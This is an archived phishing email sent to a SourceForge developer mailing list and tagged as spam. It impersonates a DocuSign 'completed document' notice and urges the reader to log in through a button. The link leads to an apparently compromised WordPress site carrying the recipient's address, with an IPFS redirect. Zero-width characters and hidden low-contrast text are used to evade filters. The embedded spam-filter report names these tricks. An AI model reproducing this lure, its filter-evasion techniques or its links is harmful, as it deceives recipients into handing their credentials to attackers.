Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id F20ACB38332
	for <lists+industrypack-devel@lfdr.de>; Wed, 27 Aug 2025 15:00:54 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=LM7ysyZDbWOTysl6V7PH/TO/VyBO6t3gGSBcRKchp20=; b=HM7JrfAaQH0MdmRu85PrlYUMV3
	Tfqhm7a7Pg++uFZ44j0zjupXJK/0kMVJx4Xx/puJ+CMu9Mbt9WxoTkwJ/zqD9tQdZJpdBC3vQKpRv
	w8cdSsNAXRRnSo0O8IbHnJmW7ocEVXrpyK+7SRXVy4dpFjuJd4RcBC0IJiyr7+8CmTvs=;
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1urFll-000408-Pu
	for lists+industrypack-devel@lfdr.de;
	Wed, 27 Aug 2025 13:00:53 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <docshare@outlook.com>) id 1urFli-000400-H5
 for industrypack-devel@lists.sourceforge.net;
 Wed, 27 Aug 2025 13:00:50 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=a2z0lMG9LYci5C5AxP2oY+IcYSh9oON6ZOutntcWQWU=; b=e/KHJ71i0IwNH6FDwxh2oKl4c8
 3sVT220iy3k68Pna/U11ln/wNgDbQYyigpy6K58xkrd9WtlWnGxqxqmMyRaeNAwba14vOQ2be8eDg
 e4jVrZvvgXtSboyM6wUg7C5G1oQ4sTi44vQHKhC+rmGC7vU4yMln5fkH6yzukEZKt2Yk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=a2z0lMG9LYci5C5AxP2oY+IcYSh9oON6ZOutntcWQWU=; b=h
 qS/TWtKu0zBrk82gGFvQ0s2qM+NSQ3k63bsSt/TbNEr/9DeCPQ2GiMwnxgrSlQi4Qk6iUKRkyifqY
 z3+jw3Gp08zXgRWMpulElI+A1JoJhtcZRjGE41neYL4aDJ1//ikjLAASObCKfZVnNQMx2GHohw3Bg
 aKBBF881dUK0TXBY=;
Received: from vps-23e6328b.vps.ovh.net ([51.89.151.163])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1urFlh-0003ac-RM for industrypack-devel@lists.sourceforge.net;
 Wed, 27 Aug 2025 13:00:50 +0000
Received: from earthymonth.ptr.network (unknown [77.110.123.217])
 by vps-23e6328b.vps.ovh.net (Postfix) with ESMTPSA id 77FB5929B5
 for <industrypack-devel@lists.sourceforge.net>;
 Wed, 27 Aug 2025 13:00:43 +0000 (UTC)
From: Docs <docshare@outlook.com>
To: industrypack-devel@lists.sourceforge.net
Date: 27 Aug 2025 15:00:42 +0200
Message-ID: <20250827150042.BD720FB94871B522@outlook.com>
MIME-Version: 1.0
X-Spam-Score: 6.0 (++++++)
X-Spam-Report: Spam detection software, running on the system "sfi-spamd-2.hosts.colo.sdot.me",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  This is an aut‍ogenerated noti‍fication. industrypack-devel@lists.sourceforge.net
    You have reci‍eved some bu‍siness Invoices on DocuSi‍gn. VI‍EW COM‍PLETED
    DOCUM‍ENT 
 
 Content analysis details:   (6.0 points, 5.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 FREEMAIL_FROM          Sender email is commonly abused enduser mail provider
                             [docshare(at)outlook.com]
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or identical to
                             background
  0.0 HTML_MESSAGE           BODY: HTML included in message
  1.4 URI_IPFSIO             References Interplanetary File System PtP content via
                             ipfs.io, likely phishing
  1.0 UNICODE_OBFU_ZW        Obfuscating text with hidden characters
  0.0 GOOG_REDIR_HTML_ONLY   Google redirect to obscure spamvertised website
                             + HTML only
  3.5 URI_WP_HACKED          URI for compromised WordPress site, possible malware
  0.0 URI_IPFS               References Interplanetary File System PtP content, probable
                             phishing
  0.0 SPOOFED_FREEMAIL       No description available.
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1urFlh-0003ac-RM
Subject: [Industrypack-devel] [SPAM] lists.sourceforge.net.pdf Approved
 Shipping Documents Complete with Docu-Sign
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============1280848880652101483=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============1280848880652101483==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;"><div dir=3D"ltr"><div style=3D"padding: 2px =
5px 0px 0px; color: rgb(102, 102, 102); font-size: 11px;">This is an aut&#8=
205;ogenerated noti&#8205;fication.</div><table style=3D"border-collapse: c=
ollapse; max-width: 640px;"><tbody><tr><td style=3D"padding: 10px 24px;">&n=
bsp;</td></tr><tr><td style=3D"padding: 0px 24px 30px;">
<table width=3D"100%" height=3D"182" align=3D"center" style=3D"color: rgb(2=
55, 255, 255); background-color: rgb(33, 78, 159);" border=3D"0" cellspacin=
g=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"center" style=3D'padding:=
 28px 10px 36px; border-radius: 2px; width: 572.03px; text-align: center; f=
ont-family: Helvetica,Arial,"Sans Serif"; font-size: 16px;'><table width=3D=
"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
<td align=3D"center" style=3D"border: currentColor; border-image: none; pad=
ding-top: 24px;"><a target=3D"_blank">industrypack-devel@lists.sourceforge.=
net</a><br><br>You have reci&#8205;eved some bu&#8205;siness&nbsp;Invoices =
on DocuSi&#8205;gn.</td></tr></tbody></table><table width=3D"100%" border=
=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"center" =
style=3D"padding-top: 30px;"><div style=3D'font-family: Helvetica,Arial,"Sa=
ns Serif",serif,EmojiFont;'><table cellspacing=3D"0" cellpadding=3D"0"><tbo=
dy><tr>
<td height=3D"44" align=3D"center" style=3D'border-radius: 2px; border: 1px=
 solid rgb(255, 255, 255); border-image: none; height: 44px; text-align: ce=
nter; font-family: Helvetica,Arial,"Sans Serif"; font-size: 14px; font-weig=
ht: bold; display: block;'>
<a style=3D"padding: 0px 12px; display: inline-block; background-color: rgb=
(255, 200, 32); text-decoration-line: none;" href=3D"http://netnext.ai/wp-c=
ontent/enh/na-english/radiumsumit-latest.php?mail=3Dindustrypack-devel@list=
s.sourceforge.net" target=3D"_blank" rel=3D"noopener &#10;noreferrer" data-=
saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://ipfs.io/ipfs/bafk=
reign75adczwsmvaqploioojogwcjmnzxdy7m5tdtaczmzhkohen4qu%23huang.sing@hsauto=
part.com&amp;source=3Dgmail&amp;ust=3D1756376363028000&amp;usg=3DAOvVaw37mX=
cfI-O1WDwVbj5ID1th">
<span style=3D'line-height: 44px; font-family: Helvetica,Arial,"Sans Serif"=
,serif,EmojiFont;'><font color=3D"#000000">VI&#8205;EW COM&#8205;PLETED DOC=
UM&#8205;ENT</font></span></a></td></tr></tbody></table></div></td></tr></t=
body></table></td></tr></tbody></table></td></tr><tr><td style=3D'padding: =
0px 24px 24px; color: rgb(0, 0, 0); font-family: Helvetica,Arial,"Sans Seri=
f"; font-size: 16px;'><table border=3D"0" cellspacing=3D"0" cellpadding=3D"=
0"><tbody><tr><td style=3D"padding-bottom: 20px;">
<div style=3D'color: rgb(51, 51, 51); line-height: 18px; font-family: Helve=
tica,Arial,"Sans Serif",serif,EmojiFont; font-size: 15px; font-weight: bold=
;'>Sec&#8205;ure Docu&#8205;ment sent to:</div><div style=3D'color: rgb(102=
, 102, 102); line-height: 18px; font-family: Helvetica,Arial,"Sans Serif",s=
erif,EmojiFont; font-size: 15px;'>industrypack-devel@lists.sourceforge.net&=
nbsp;on 8/27/2025 3:00:42 p.m.</div></td></tr></tbody></table><p style=3D"c=
olor: rgb(51, 51, 51); line-height: 20px; font-size: 15px;">
Kindly l&#8205;og in with the link ab&#8205;ove to view your completed docu=
&#8205;ment.<br>Thank you,<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;<br><br></p><p style=3D"font-size: 12px;">The&nbsp;industrypack-devel Doc&=
#8205;s Te&#8205;am</p></td></tr><tr><td style=3D'padding: 0px 24px 12px; c=
olor: rgb(102, 102, 102); font-family: Helvetica,Arial,"Sans Serif"; font-s=
ize: 11px;'><table border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody>=
<tr><td valign=3D"top" style=3D"vertical-align: top;">
<div style=3D'padding: 2px 5px 0px 0px; font-family: Helvetica,Arial,"Sans =
Serif",serif,EmojiFont;'>Powered by&nbsp;<span style=3D"color: rgb(51, 51, =
51); font-size: 12px; font-weight: 900;">DocuSi&#8205;gn for lists.sourcefo=
rge.net.</span></div></td><td>&nbsp;</td></tr></tbody></table></td></tr><tr=
><td style=3D"padding: 30px 24px 45px; background-color: rgb(234, 234, 234)=
;"><p style=3D'color: rgb(234, 234, 234); line-height: 18px; font-family: H=
elvetica,Arial,"Sans Serif"; font-size: 13px; margin-bottom: 1em;'>
<a href=3D"http://hsautopart.com/" target=3D"_blank" data-saferedirecturl=
=3D"https://www.google.com/url?q=3Dhttp://hsautopart.com&amp;source=3Dgmail=
&amp;ust=3D1756376363028000&amp;usg=3DAOvVaw0Iq8_KAXa6dordi8YUrBp_">lists.s=
ourceforge.net</a></p><p style=3D'color: rgb(102, 102, 102); line-height: 1=
8px; font-family: Helvetica,Arial,"Sans Serif"; font-size: 13px; margin-bot=
tom: 1em;'><b>Do Not Share This Email</b><br>
This email contains a sec&#8205;ure link to DocuS&#8205;ign. Please do not =
share or forward this email, li&#8205;nk, or access co&#8205;de with others=
=2E<br>&nbsp;</p><p style=3D'color: rgb(102, 102, 102); line-height: 18px; =
font-family: Helvetica,Arial,"Sans Serif"; font-size: 13px; margin-bottom: =
1em;'><b>About DocuS&#8205;ign</b><br>
Sign do&#8205;cuments electronically in just minutes. It's safe, secure, an=
d legally binding. Whether you're in an office, at home, on-the-go -- or ev=
en across the globe -- Do&#8205;cuSign provides a professional trusted solu=
tion for Digital Transactions .</p><cite style=3D"font-size: 0px;"><a href=
=3D"http://hsautopart.com/" target=3D"_blank" data-saferedirecturl=3D"https=
://www.google.com/url?q=3Dhttp://hsautopart.com&amp;source=3Dgmail&amp;ust=
=3D1756376363028000&amp;usg=3DAOvVaw0Iq8_KAXa6dordi8YUrBp_">
hsautopart.com</a></cite></td></tr></tbody></table></div></body></html>


--===============1280848880652101483==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============1280848880652101483==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============1280848880652101483==--
